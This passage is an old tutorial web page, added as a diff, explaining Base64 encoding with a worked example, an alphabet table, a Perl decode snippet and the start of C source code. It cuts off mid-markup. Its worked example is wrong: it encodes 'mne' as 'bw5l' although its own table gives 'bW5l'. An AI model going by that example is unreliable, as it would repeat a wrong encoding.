@@ -1,0 +1,1317 @@
+<html xmlns:o="urn:schemas-microsoft-com:office:office"
+xmlns:w="urn:schemas-microsoft-com:office:word"
+xmlns="http://www.w3.org/TR/REC-html40">
+
+<head>
+<meta http-equiv=Content-Type content="text/html; charset=windows-1252">
+<meta name=ProgId content=Word.Document>
+<meta name=Generator content="Microsoft Word 9">
+<meta name=Originator content="Microsoft Word 9">
+<link rel=File-List href="./base64_files/filelist.xml">
+<title>Base64 Encoding Decoding C code, Source, Perl Script</title>
+<!--[if gte mso 9]><xml>
+ <o:DocumentProperties>
+  <o:Author>Ankit Fadia</o:Author>
+  <o:Template>Normal</o:Template>
+  <o:LastAuthor>Ankit Fadia</o:LastAuthor>
+  <o:Revision>2</o:Revision>
+  <o:TotalTime>46</o:TotalTime>
+  <o:Created>2000-12-10T21:16:00Z</o:Created>
+  <o:LastSaved>2000-12-10T21:16:00Z</o:LastSaved>
+  <o:Pages>7</o:Pages>
+  <o:Words>1648</o:Words>
+  <o:Characters>9396</o:Characters>
+  <o:Company>Hacking Truths</o:Company>
+  <o:Lines>78</o:Lines>
+  <o:Paragraphs>18</o:Paragraphs>
+  <o:CharactersWithSpaces>11538</o:CharactersWithSpaces>
+  <o:Version>9.2720</o:Version>
+ </o:DocumentProperties>
+</xml><![endif]--><!--[if gte mso 9]><xml>
+ <w:WordDocument>
+  <w:DisplayHorizontalDrawingGridEvery>0</w:DisplayHorizontalDrawingGridEvery>
+  <w:DisplayVerticalDrawingGridEvery>0</w:DisplayVerticalDrawingGridEvery>
+  <w:UseMarginsForDrawingGridOrigin/>
+  <w:Compatibility>
+   <w:FootnoteLayoutLikeWW8/>
+   <w:ShapeLayoutLikeWW8/>
+   <w:AlignTablesRowByRow/>
+   <w:ForgetLastTabAlignment/>
+   <w:LayoutRawTableWidth/>
+   <w:LayoutTableRowsApart/>
+  </w:Compatibility>
+ </w:WordDocument>
+</xml><![endif]--> 
+<style>
+<!--
+ /* Style Definitions */
+p.MsoNormal, li.MsoNormal, div.MsoNormal
+	{mso-style-parent:"";
+	margin:0in;
+	margin-bottom:.0001pt;
+	mso-pagination:widow-orphan;
+	font-size:10.0pt;
+	font-family:"Times New Roman";
+	mso-fareast-font-family:"Times New Roman";
+	mso-bidi-font-family:"Times New Roman";}
+@page Section1
+	{size:8.5in 11.0in;
+	margin:1.0in 1.25in 1.0in 1.25in;
+	mso-header-margin:.5in;
+	mso-footer-margin:.5in;
+	mso-paper-source:0;}
+div.Section1
+	{page:Section1;}
+a:active {  text-decoration: none}
+a:hover {  text-decoration: underline}
+a:link {  text-decoration: none}
+a:visited {  text-decoration: none}
+-->
+</style>
+</head>
+
+<body lang=EN-US link=#99CCFF vlink=#CCCCFF style='tab-interval:.5in' bgcolor="#000000" text="#CCCCCC" alink="#CCFF99" leftmargin="20" topmargin="20" marginwidth="20" marginheight="20">
+<div class=Section1> 
+  <p class=MsoNormal><font size="2" face="Arial, Helvetica, sans-serif"><span style='mso-bidi-font-family:"Courier New"'><o:p></o:p></span></font><font size="2"><span style='mso-bidi-font-family:"Courier New"'><o:p></o:p></span></font><font size="2" face="Arial, Helvetica, sans-serif" color="#FFFFFF">_______________________________________________________</font></p>
+  <p class=MsoNormal><font size="2" face="Arial, Helvetica, sans-serif" color="#FFFFFF"><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></font></p>
+  <p class=MsoNormal><font size="2" face="Arial, Helvetica, sans-serif" color="#FFFFFF"><b>Base64 
+    Encoding Torn Apart By Ankit Fadia <a
+href="mailto:ankit@bol.net.in">ankit@bol.net.in</a><o:p></o:p></b></font></p>
+  <p class=MsoNormal><font size="2" face="Arial, Helvetica, sans-serif" color="#FFFFFF">_______________________________________________________</font></p>
+  <p class=MsoNormal><font size="2" face="Arial, Helvetica, sans-serif" color="#FFFFFF"><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></font><font size="2" face="Arial, Helvetica, sans-serif"><o:p></o:p></font></p>
+  <p class=MsoNormal><font size="2" face="Arial, Helvetica, sans-serif">Since 
+    its introduction, Base64 encoding has extremely quickly gained popularity. 
+    Besides being the default Encoding standard being used for encoding files 
+    to be sent as attachments by <font color="#FFFFFF"><b>Multipurpose Internet 
+    Mail Extensions or MIME</b></font>, it has also started being used in a number 
+    of other places.</font></p>
+  <p class=MsoNormal><font size="2" face="Arial, Helvetica, sans-serif"><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></font></p>
+  <p class=MsoNormal><font size="2" face="Arial, Helvetica, sans-serif">Please 
+    note that almost all email clients use MIME to send files as attachments, 
+    this in turn means that a majority of email clients are using Base64 to encode 
+    files, before being sent across networks. </font></p>
+  <p class=MsoNormal><font size="2" face="Arial, Helvetica, sans-serif"><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></font></p>
+  <p class=MsoNormal><font size="2" face="Arial, Helvetica, sans-serif">Another 
+    popular usage of Base64 encoding is in the case of Web Servers implementing 
+    HTTP Based Basic Authentication. When the server wants to restrict or control 
+    the access to certain folders, then, it can password protect them by using 
+    HTTP Based Basic Authentication.<span
+style="mso-spacerun: yes">  </span>Basic Authentication uses the Base64 Encoding 
+    standard to encode the Username and Password and store them. </font></p>
+  <p class=MsoNormal><font size="2" face="Arial, Helvetica, sans-serif"><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></font></p>
+  <p class=MsoNormal><font size="2" face="Arial, Helvetica, sans-serif">So, basically 
+    what my point is that Base64 Encoding has a number of practical usages and 
+    due to the fact that it is very easy to implement, it is being put to use 
+    for a number of purposes at a number of places by a number of parties. Get 
+    my point? </font></p>
+  <p class=MsoNormal><font size="2" face="Arial, Helvetica, sans-serif"><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></font></p>
+  <p class=MsoNormal><font size="2" face="Arial, Helvetica, sans-serif">However, 
+    it continues to remain by far the lamest encoding standard or the poorest 
+    means of security.<span style="mso-spacerun: yes"> </span>You see instead 
+    of the text being passed through a powerful, difficult to break algorithm 
+    and being encrypted, it is only being encoded by a relatively simple to reverse 
+    encoding standard. </font></p>
+  <p class=MsoNormal><font size="2" face="Arial, Helvetica, sans-serif"><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></font></p>
+  <p class=MsoNormal><font size="2" face="Arial, Helvetica, sans-serif">Base64 
+    uses a 65-character subset of US-ASCII, allowing 6 bits for each character. 
+    For Example, take the character ‘m’ for instance. The character ‘m’ has a 
+    Base64 value of 38. How did we get this value? Well, there is a Base64 Alphabet 
+    chart included at the end of this tutorial, which contains all the alphabets 
+    and their corresponding Base64 value. So, each time you want to get the Base64 
+    value of an ASCII character, you need to refer to this Base64 Value chart. 
+    Anyway, getting back to our example, the character ‘m’ has a Base64 value 
+    of 38, which when represented in binary form, is 100110. </font></p>
+  <p class=MsoNormal><font size="2" face="Arial, Helvetica, sans-serif"><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></font></p>
+  <p class=MsoNormal><font size="2" face="Arial, Helvetica, sans-serif">Now, let 
+    us take yet another example to see how a text is encoded by Base64 Encoding. 
+    Say, that the text to be encoded is: ‘mne’.<span
+style="mso-spacerun: yes">  </span>The text is firstly converted into its decimal 
+    value. </font></p>
+  <p class=MsoNormal><font size="2" face="Arial, Helvetica, sans-serif"><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></font></p>
+  <p class=MsoNormal><font size="2" face="Arial, Helvetica, sans-serif">The character 
+    &quot;m&quot; has the decimal value of 109</font></p>
+  <p class=MsoNormal><font size="2" face="Arial, Helvetica, sans-serif">The character 
+    &quot;n&quot; has the decimal value of 110</font></p>
+  <p class=MsoNormal><font size="2" face="Arial, Helvetica, sans-serif">The character 
+    &quot;e&quot; has the decimal value of 101</font></p>
+  <p class=MsoNormal><font size="2" face="Arial, Helvetica, sans-serif"><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></font></p>
+  <p class=MsoNormal><font size="2" face="Arial, Helvetica, sans-serif">This implies 
+    that &quot;mne&quot; ( three 8-bit-byte text string) is 109 110 101 in decimal 
+    form. When converted to binary the string looks like this:</font></p>
+  <p class=MsoNormal><font size="2" face="Arial, Helvetica, sans-serif"><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></font></p>
+  <p class=MsoNormal><font size="2" face="Arial, Helvetica, sans-serif">01101101<span style="mso-spacerun: yes">   
+    </span>01101110<span style="mso-spacerun: yes">   </span>01100101</font></p>
+  <p class=MsoNormal><font size="2" face="Arial, Helvetica, sans-serif"><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></font></p>
+  <p class=MsoNormal><font size="2" face="Arial, Helvetica, sans-serif">These 
+    three 8-bit-bytes are concatenated (linked together) to make a 24-bit stream:</font></p>
+  <p class=MsoNormal><font size="2" face="Arial, Helvetica, sans-serif"><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></font></p>
+  <p class=MsoNormal><font size="2" face="Arial, Helvetica, sans-serif">011011010110111001100101</font></p>
+  <p class=MsoNormal><font size="2" face="Arial, Helvetica, sans-serif"><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></font></p>
+  <p class=MsoNormal><font size="2" face="Arial, Helvetica, sans-serif">This 24-bit 
+    stream is then split up into four 6-bit sections:</font></p>
+  <p class=MsoNormal><font size="2" face="Arial, Helvetica, sans-serif"><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></font></p>
+  <p class=MsoNormal><font size="2" face="Arial, Helvetica, sans-serif">011011 
+    010110 111001 100101</font></p>
+  <p class=MsoNormal><font size="2" face="Arial, Helvetica, sans-serif"><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></font></p>
+  <p class=MsoNormal><font size="2" face="Arial, Helvetica, sans-serif">We now 
+    have 4 values. These binary values, when converted into decimal form look 
+    like this:</font></p>
+  <p class=MsoNormal><font size="2" face="Arial, Helvetica, sans-serif"><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></font></p>
+  <p class=MsoNormal><font size="2" face="Arial, Helvetica, sans-serif">27 22 
+    57 37</font></p>
+  <p class=MsoNormal><font size="2" face="Arial, Helvetica, sans-serif"><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></font></p>
+  <p class=MsoNormal><font size="2" face="Arial, Helvetica, sans-serif">Now each 
+    character of the Base64 character set has a decimal value. We now change these 
+    decimal values into the Base64 equivalent:</font></p>
+  <p class=MsoNormal><font size="2" face="Arial, Helvetica, sans-serif"><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></font></p>
+  <p class=MsoNormal><font size="2" face="Arial, Helvetica, sans-serif">27 = b 
+    </font></p>
+  <p class=MsoNormal><font size="2" face="Arial, Helvetica, sans-serif">22 = w</font></p>
+  <p class=MsoNormal><font size="2" face="Arial, Helvetica, sans-serif">57 = 5</font></p>
+  <p class=MsoNormal><font size="2" face="Arial, Helvetica, sans-serif">37 = l</font></p>
+  <p class=MsoNormal><font size="2" face="Arial, Helvetica, sans-serif"><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></font></p>
+  <p class=MsoNormal><font size="2" face="Arial, Helvetica, sans-serif">So &quot;mne&quot; 
+    when encoded as Base64 reads as &quot;bw5l&quot;. Below is a table of the 
+    Base64 character set with their decimal values:</font></p>
+  <p class=MsoNormal><font size="2" face="Arial, Helvetica, sans-serif"><span style="mso-spacerun: yes">                        
+    </span></font></p>
+  <p class=MsoNormal style='margin-left:.5in;text-indent:.5in'><font size="2" face="Arial, Helvetica, sans-serif"><span
+style="mso-spacerun: yes">    </span><b><font color="#FFFFFF">Table 1: The Base64 
+    Alphabet</font><o:p></o:p></b></font></p>
+  <p class=MsoNormal><font size="2" face="Arial, Helvetica, sans-serif"><![if !supportEmptyParas]>&nbsp;<![endif]><br>
+    </font></p>
+  <table width="600" border="1" cellspacing="0" cellpadding="5" bordercolor="#999999">
+    <tr bgcolor="#333333"> 
+      <td> 
+        <center>
+          <b><font size="2" face="Arial, Helvetica, sans-serif" color="#FFFFFF">Value 
+          Encoding</font> </b> 
+        </center>
+      </td>
+      <td> 
+        <center>
+          <b><font size="2" face="Arial, Helvetica, sans-serif" color="#FFFFFF">Value 
+          Encoding</font> </b> 
+        </center>
+      </td>
+      <td> 
+        <center>
+          <b><font size="2" face="Arial, Helvetica, sans-serif" color="#FFFFFF">Value 
+          Encoding</font> </b> 
+        </center>
+      </td>
+      <td> 
+        <center>
+          <b><font size="2" face="Arial, Helvetica, sans-serif" color="#FFFFFF">Value 
+          Encoding</font> </b> 
+        </center>
+      </td>
+    </tr>
+    <tr> 
+      <td> 
+        <center>
+          <font size="2" face="Arial, Helvetica, sans-serif">0 <span style="mso-spacerun:
+yes">       </span>A</font> 
+        </center>
+      </td>
+      <td> 
+        <center>
+          <font size="2" face="Arial, Helvetica, sans-serif">17<span
+style="mso-spacerun: yes">         </span>R</font> 
+        </center>
+      </td>
+      <td> 
+        <center>
+          <font size="2" face="Arial, Helvetica, sans-serif">34<span style="mso-spacerun: yes">         
+          </span>i</font> 
+        </center>
+      </td>
+      <td> 
+        <center>
+          <font size="2" face="Arial, Helvetica, sans-serif">51<span style="mso-spacerun:
+yes">      </span>z</font> 
+        </center>
+      </td>
+    </tr>
+    <tr bgcolor="#333333"> 
+      <td> 
+        <center>
+          <font size="2" face="Arial, Helvetica, sans-serif" color="#FFFFFF">1<span style="mso-spacerun: yes">        
+          </span>B</font> 
+        </center>
+      </td>
+      <td> 
+        <center>
+          <font size="2" face="Arial, Helvetica, sans-serif" color="#FFFFFF">18<span
+style="mso-spacerun: yes">         </span>S</font> 
+        </center>
+      </td>
+      <td> 
+        <center>
+          <font size="2" face="Arial, Helvetica, sans-serif" color="#FFFFFF">35<span style="mso-spacerun: yes">         
+          </span>j</font> 
+        </center>
+      </td>
+      <td> 
+        <center>
+          <font size="2" face="Arial, Helvetica, sans-serif" color="#FFFFFF">52 
+          <span style="mso-spacerun:
+yes">     </span>0</font> 
+        </center>
+      </td>
+    </tr>
+    <tr> 
+      <td> 
+        <center>
+          <font size="2" face="Arial, Helvetica, sans-serif">2<span
+style="mso-spacerun: yes">        </span>C</font> 
+        </center>
+      </td>
+      <td> 
+        <center>
+          <font size="2" face="Arial, Helvetica, sans-serif"><span style="mso-spacerun:
+yes"> </span>19<span style="mso-spacerun: yes">         </span>T</font> 
+        </center>
+      </td>
+      <td> 
+        <center>
+          <font size="2" face="Arial, Helvetica, sans-serif"><span style="mso-spacerun: yes"> 
+          </span>36<span
+style="mso-spacerun: yes">         </span>k</font> 
+        </center>
+      </td>
+      <td> 
+        <center>
+          <font size="2" face="Arial, Helvetica, sans-serif"><span style="mso-spacerun:
+yes"> </span>53 <span style='mso-tab-count:1'>  </span><span
+style="mso-spacerun: yes">   </span>1</font> 
+        </center>
+      </td>
+    </tr>
+    <tr bgcolor="#333333"> 
+      <td> 
+        <center>
+          <font size="2" face="Arial, Helvetica, sans-serif" color="#FFFFFF">3<span
+style="mso-spacerun: yes">        </span>D</font> 
+        </center>
+      </td>
+      <td> 
+        <center>
+          <font size="2" face="Arial, Helvetica, sans-serif" color="#FFFFFF">20<span style="mso-spacerun: yes">   
+                </span>U</font> 
+        </center>
+      </td>
+      <td> 
+        <center>
+          <font size="2" face="Arial, Helvetica, sans-serif" color="#FFFFFF">37<span style="mso-spacerun:
+yes">         </span>l</font> 
+        </center>
+      </td>
+      <td> 
+        <center>
+          <font size="2" face="Arial, Helvetica, sans-serif" color="#FFFFFF">54 
+          <span
+style='mso-tab-count:1'>  </span><span style="mso-spacerun:
+yes">   </span>2</font> 
+        </center>
+      </td>
+    </tr>
+    <tr> 
+      <td> 
+        <center>
+          <font size="2" face="Arial, Helvetica, sans-serif">4<span
+style="mso-spacerun: yes">        </span>E</font> 
+        </center>
+      </td>
+      <td> 
+        <center>
+          <font size="2" face="Arial, Helvetica, sans-serif"><span style="mso-spacerun:
+yes"> </span>21<span style="mso-spacerun: yes">         </span>V</font> 
+        </center>
+      </td>
+      <td> 
+        <center>
+          <font size="2" face="Arial, Helvetica, sans-serif"><span style="mso-spacerun: yes"> 
+          </span>38<span
+style="mso-spacerun: yes">        </span>m</font> 
+        </center>
+      </td>
+      <td> 
+        <center>
+          <font size="2" face="Arial, Helvetica, sans-serif"><span style="mso-spacerun:
+yes"> </span>55<span style='mso-tab-count:1'>   </span><span
+style="mso-spacerun: yes">   </span>3</font> 
+        </center>
+      </td>
+    </tr>
+    <tr bgcolor="#333333"> 
+      <td> 
+        <center>
+          <font size="2" face="Arial, Helvetica, sans-serif" color="#FFFFFF">5<span
+style="mso-spacerun: yes">        </span>F</font> 
+        </center>
+      </td>
+      <td> 
+        <center>
+          <font size="2" face="Arial, Helvetica, sans-serif" color="#FFFFFF">22<span style="mso-spacerun: yes">         
+          </span>W</font>
+        </center>
+      </td>
+      <td> 
+        <center>
+          <font size="2" face="Arial, Helvetica, sans-serif" color="#FFFFFF">39<span
+style="mso-spacerun: yes">         </span>n</font> 
+        </center>
+      </td>
+      <td> 
+        <center>
+          <font size="2" face="Arial, Helvetica, sans-serif" color="#FFFFFF">56<span style='mso-tab-count:1'> 
+            </span><span
+style="mso-spacerun: yes">   </span>4</font> 
+        </center>
+      </td>
+    </tr>
+    <tr> 
+      <td> 
+        <center>
+          <font size="2" face="Arial, Helvetica, sans-serif">6<span
+style="mso-spacerun: yes">        </span>G</font> 
+        </center>
+      </td>
+      <td> 
+        <center>
+          <font size="2" face="Arial, Helvetica, sans-serif">23<span style="mso-spacerun: yes">         
+          </span>X</font> 
+        </center>
+      </td>
+      <td> 
+        <center>
+          <font size="2" face="Arial, Helvetica, sans-serif"><span style="mso-spacerun: yes"> 
+          </span>40<span
+style="mso-spacerun: yes">         </span>o</font> 
+        </center>
+      </td>
+      <td> 
+        <center>
+          <font size="2" face="Arial, Helvetica, sans-serif"><span style="mso-spacerun:
+yes"> </span>57 <span style='mso-tab-count:1'> </span><span
+style="mso-spacerun: yes">    </span>5</font> 
+        </center>
+      </td>
+    </tr>
+    <tr bgcolor="#333333"> 
+      <td> 
+        <center>
+          <font size="2" face="Arial, Helvetica, sans-serif" color="#FFFFFF">7<span
+style="mso-spacerun: yes">        </span>H</font> 
+        </center>
+      </td>
+      <td> 
+        <center>
+          <font size="2" face="Arial, Helvetica, sans-serif" color="#FFFFFF">24<span style="mso-spacerun: yes">         
+          </span>Y</font> 
+        </center>
+      </td>
+      <td> 
+        <center>
+          <font size="2" face="Arial, Helvetica, sans-serif" color="#FFFFFF">41<span
+style="mso-spacerun: yes">         </span>p</font> 
+        </center>
+      </td>
+      <td> 
+        <center>
+          <font size="2" face="Arial, Helvetica, sans-serif" color="#FFFFFF">58<span style='mso-tab-count:1'> </span><span
+style="mso-spacerun: yes">    </span>6</font> 
+        </center>
+      </td>
+    </tr>
+    <tr> 
+      <td> 
+        <center>
+          <font size="2" face="Arial, Helvetica, sans-serif">8<span
+style="mso-spacerun: yes">         </span>I</font> 
+        </center>
+      </td>
+      <td> 
+        <center>
+          <font size="2" face="Arial, Helvetica, sans-serif">25<span style="mso-spacerun: yes">  
+                 </span>Z</font> 
+        </center>
+      </td>
+      <td> 
+        <center>
+          <font size="2" face="Arial, Helvetica, sans-serif">42<span
+style="mso-spacerun: yes">         </span>q</font> 
+        </center>
+      </td>
+      <td> 
+        <center>
+          <font size="2" face="Arial, Helvetica, sans-serif"><span style="mso-spacerun:
+yes"> </span>59 <span style='mso-tab-count:1'> </span><span
+style="mso-spacerun: yes">    </span>7</font> 
+        </center>
+      </td>
+    </tr>
+    <tr bgcolor="#333333"> 
+      <td> 
+        <center>
+          <font size="2" face="Arial, Helvetica, sans-serif" color="#FFFFFF">9<span
+style="mso-spacerun: yes">        </span>J</font> 
+        </center>
+      </td>
+      <td> 
+        <center>
+          <font size="2" face="Arial, Helvetica, sans-serif" color="#FFFFFF">26<span style="mso-spacerun: yes">         
+          </span>a</font> 
+        </center>
+      </td>
+      <td> 
+        <center>
+          <font size="2" face="Arial, Helvetica, sans-serif" color="#FFFFFF"><span style="mso-spacerun: yes"> </span>43 
+          <span style='mso-tab-count:1'>      </span><span
+style="mso-spacerun: yes">   </span>r</font> 
+        </center>
+      </td>
+      <td> 
+        <center>
+          <font size="2" face="Arial, Helvetica, sans-serif" color="#FFFFFF">60<span style='mso-tab-count:1'> </span><span
+style="mso-spacerun: yes">    </span>8</font> 
+        </center>
+      </td>
+    </tr>
+    <tr> 
+      <td> 
+        <center>
+          <font size="2" face="Arial, Helvetica, sans-serif">10<span
+style="mso-spacerun: yes">       </span>K</font> 
+        </center>
+      </td>
+      <td> 
+        <center>
+          <font size="2" face="Arial, Helvetica, sans-serif">27<span style="mso-spacerun: yes">         
+          </span>b</font> 
+        </center>
+      </td>
+      <td> 
+        <center>
+          <font size="2" face="Arial, Helvetica, sans-serif">44 <span
+style='mso-tab-count:1'>     </span><span style="mso-spacerun:
+yes">   </span>s</font> 
+        </center>
+      </td>
+      <td> 
+        <center>
+          <font size="2" face="Arial, Helvetica, sans-serif">61<span
+style='mso-tab-count:1'> </span><span style="mso-spacerun: yes">    </span>9</font> 
+        </center>
+      </td>
+    </tr>
+    <tr bgcolor="#333333"> 
+      <td> 
+        <center>
+          <font size="2" face="Arial, Helvetica, sans-serif" color="#FFFFFF">11<span
+style="mso-spacerun: yes">       </span>L</font> 
+        </center>
+      </td>
+      <td> 
+        <center>
+          <font size="2" face="Arial, Helvetica, sans-serif" color="#FFFFFF">28<span style="mso-spacerun: yes">         
+          </span>c</font> 
+        </center>
+      </td>
+      <td> 
+        <center>
+          <font size="2" face="Arial, Helvetica, sans-serif" color="#FFFFFF">45<span
+style='mso-tab-count:1'>        </span><span style="mso-spacerun:
+yes"> </span>t</font> 
+        </center>
+      </td>
+      <td> 
+        <center>
+          <font size="2" face="Arial, Helvetica, sans-serif" color="#FFFFFF">62 
+          <span style="mso-spacerun:
+yes">    </span>+</font> 
+        </center>
+      </td>
+    </tr>
+    <tr> 
+      <td> 
+        <center>
+          <font size="2" face="Arial, Helvetica, sans-serif">12<span
+style="mso-spacerun: yes">       </span>M</font> 
+        </center>
+      </td>
+      <td> 
+        <center>
+          <font size="2" face="Arial, Helvetica, sans-serif">29<span style="mso-spacerun: yes">         
+          </span>d</font> 
+        </center>
+      </td>
+      <td> 
+        <center>
+          <font size="2" face="Arial, Helvetica, sans-serif">46 <span style='mso-tab-count:1'>     
+          </span><span
+style="mso-spacerun: yes">   </span>u</font> 
+        </center>
+      </td>
+      <td> 
+        <center>
+          <font size="2" face="Arial, Helvetica, sans-serif"><span style="mso-spacerun:
+yes"> </span>63<span style='mso-tab-count:1'>  </span><span
+style="mso-spacerun: yes">    </span>/</font> 
+        </center>
+      </td>
+    </tr>
+    <tr bgcolor="#333333"> 
+      <td> 
+        <center>
+          <font size="2" face="Arial, Helvetica, sans-serif" color="#FFFFFF">13<span
+style="mso-spacerun: yes">       </span>N</font> 
+        </center>
+      </td>
+      <td> 
+        <center>
+          <font size="2" face="Arial, Helvetica, sans-serif" color="#FFFFFF">30<span style="mso-spacerun: yes">         
+          </span>e</font> 
+        </center>
+      </td>
+      <td> 
+        <center>
+          <font size="2" face="Arial, Helvetica, sans-serif" color="#FFFFFF">47 
+          <span
+style='mso-tab-count:1'>      </span><span style="mso-spacerun:
+yes">  </span>v</font> 
+        </center>
+      </td>
+      <td> 
+        <center>
+          <font size="2" face="Arial, Helvetica, sans-serif" color="#FFFFFF">(pad) 
+          =</font> 
+        </center>
+      </td>
+    </tr>
+    <tr> 
+      <td> 
+        <center>
+          <font size="2" face="Arial, Helvetica, sans-serif">14<span
+style="mso-spacerun: yes">       </span>O</font> 
+        </center>
+      </td>
+      <td> 
+        <center>
+          <font size="2" face="Arial, Helvetica, sans-serif"><span style="mso-spacerun:
+yes"> </span>31<span style="mso-spacerun: yes">         </span>f</font> 
+        </center>
+      </td>
+      <td> 
+        <center>
+          <font size="2" face="Arial, Helvetica, sans-serif">48 <span
+style='mso-tab-count:1'>      </span><span style="mso-spacerun:
+yes"> </span>w</font> 
+        </center>
+      </td>
+      <td> 
+        <center>
+        </center>
+      </td>
+    </tr>
+    <tr bgcolor="#333333"> 
+      <td> 
+        <center>
+          <font size="2" face="Arial, Helvetica, sans-serif" color="#FFFFFF">15<span
+style="mso-spacerun: yes">       </span>P</font> 
+        </center>
+      </td>
+      <td> 
+        <center>
+          <font size="2" face="Arial, Helvetica, sans-serif" color="#FFFFFF">32<span style="mso-spacerun: yes">         
+          </span>g</font> 
+        </center>
+      </td>
+      <td> 
+        <center>
+          <font size="2" face="Arial, Helvetica, sans-serif" color="#FFFFFF">49<span
+style='mso-tab-count:1'>         </span> x</font> 
+        </center>
+      </td>
+      <td> 
+        <center>
+          <font color="#FFFFFF"> </font> 
+        </center>
+      </td>
+    </tr>
+    <tr> 
+      <td> 
+        <center>
+          <font size="2" face="Arial, Helvetica, sans-serif">16<span
+style="mso-spacerun: yes">       </span>Q</font> 
+        </center>
+      </td>
+      <td> 
+        <center>
+          <font size="2" face="Arial, Helvetica, sans-serif">33<span style="mso-spacerun: yes">   
+                </span>h</font> 
+        </center>
+      </td>
+      <td> 
+        <center>
+          <font size="2" face="Arial, Helvetica, sans-serif"><span style="mso-spacerun: yes"> 
+          </span>50<span
+style="mso-spacerun: yes">         </span>y</font> 
+        </center>
+      </td>
+      <td> 
+        <center>
+        </center>
+      </td>
+    </tr>
+  </table>
+  <p class=MsoNormal><br>
+    <br>
+    <font size="2" face="Arial, Helvetica, sans-serif"><o:p></o:p></font></p>
+  <p class=MsoNormal><font size="2" face="Arial, Helvetica, sans-serif">When decoding 
+    a Base64 string just do the reverse:</font></p>
+  <p class=MsoNormal><font size="2" face="Arial, Helvetica, sans-serif"><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></font></p>
+  <p class=MsoNormal><font size="2" face="Arial, Helvetica, sans-serif">1) Convert 
+    the character to its Base64 decimal value.</font></p>
+  <p class=MsoNormal><font size="2" face="Arial, Helvetica, sans-serif">2) Convert 
+    this decimal value into binary.</font></p>
+  <p class=MsoNormal><font size="2" face="Arial, Helvetica, sans-serif">3) Squash 
+    the 6 bits of each character into one big string of binary digits.</font></p>
+  <p class=MsoNormal><font size="2" face="Arial, Helvetica, sans-serif">4) Split 
+    this string up into groups of 8 bits (starting from right to left).</font></p>
+  <p class=MsoNormal><font size="2" face="Arial, Helvetica, sans-serif">5) Convert 
+    each 8-bit binary value into a decimal number.</font></p>
+  <p class=MsoNormal><font size="2" face="Arial, Helvetica, sans-serif">6) Convert 
+    this decimal value into its US-ASCII equivalent.</font></p>
+  <p class=MsoNormal><font size="2" face="Arial, Helvetica, sans-serif"><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></font></p>
+  <p class=MsoNormal><font size="2" face="Arial, Helvetica, sans-serif">For those 
+    of you who do not want to use the manual method of decoding a Base64 encoded 
+    value, I have the following Perl script, which will do it for you:</font></p>
+  <p class=MsoNormal><font size="2" face="Arial, Helvetica, sans-serif"><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF">use 
+    MIME::Base64; </font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF">print 
+    decode_base64(&quot;Insert Text to be decoded here.&quot;);</font></p>
+  <p class=MsoNormal><font size="2" face="Arial, Helvetica, sans-serif"><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></font></p>
+  <p class=MsoNormal><font size="2" face="Arial, Helvetica, sans-serif"><span style='mso-bidi-font-size:18.0pt'>H</span>ere's 
+    the C source code for the Base 64 encoder/decoder. </font></p>
+  <p class=MsoNormal><font size="2" face="Arial, Helvetica, sans-serif"><span style='mso-bidi-font-family:"Courier New"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Arial, Helvetica, sans-serif"><span style='mso-bidi-font-family:"Courier New"'><font face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF">/*<o:p></o:p></font></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'>Dave 
+    Winer, dwiner@well.com, UserLand Software, 4/7/97<o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style="mso-spacerun: yes"> </span>*/<o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
+style="mso-spacerun: yes">  </span><o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'>#include 
+    &lt;appletdefs.h&gt;<o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'>#include 
+    &lt;iac.h&gt;<o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'>#include 
+    &quot;base64.h&quot;<o:p></o:p></span></font></p>
+  <p class=MsoNormal><font size="2" face="Verdana, Arial, Helvetica, sans-serif" color="#FFFFFF"><span style='mso-bidi-font-family:"Courier New"'><span
